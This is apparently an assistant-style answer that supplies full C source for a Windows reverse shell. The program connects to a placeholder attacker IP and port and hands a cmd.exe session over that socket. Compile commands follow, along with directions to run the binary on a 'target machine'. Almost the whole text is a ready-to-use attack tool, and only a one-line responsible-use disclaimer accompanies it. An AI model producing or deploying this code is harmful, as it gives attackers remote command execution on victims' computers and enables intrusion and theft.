Here is an example of a basic reverse shell in C language for Windows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

int main(int argc, char *argv[]) {
    WSADATA wsaData;
    SOCKET sockfd;
    struct sockaddr_in serverAddr;
    STARTUPINFO info = {0};
    PROCESS_INFORMATION processInfo = {0};

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Error initializing winsock.\n");
        return 1;
    }

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == INVALID_SOCKET) {
        printf("Error creating socket.\n");
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr("<YOUR_IP_ADDRESS>");
    serverAddr.sin_port = htons(<YOUR_PORT_NUMBER>);

    if (connect(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Error connecting to server.\n");
        return 1;
    } else {
        printf("Connected to server.\n");
    }

    // Redirect stdin, stdout, and stderr to the socket
    info.cb = sizeof(info);
    info.dwFlags = STARTF_USESTDHANDLES;
    info.hStdInput = info.hStdOutput = info.hStdError = (HANDLE) sockfd;

    // Create a new cmd.exe process
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);

    // Wait for the process to exit
    WaitForSingleObject(processInfo.hProcess, INFINITE);

    // Close the socket and cleanup
    closesocket(sockfd);
    WSACleanup();

    return 0;
}
```

Please note that you will need to replace `<YOUR_IP_ADDRESS>` and `<YOUR_PORT_NUMBER>` with your own IP address and port number respectively. Also, ensure that your firewall allows incoming connections on the specified port.

To compile the code, you can use MinGW compiler for Windows:

```
gcc reverse_shell.c -lws2_32 -o reverse_shell.exe
```

After compiling, you can run the executable on the target machine to establish a reverse shell back to your machine.

Please use this code responsibly and only on systems you have permission to access.

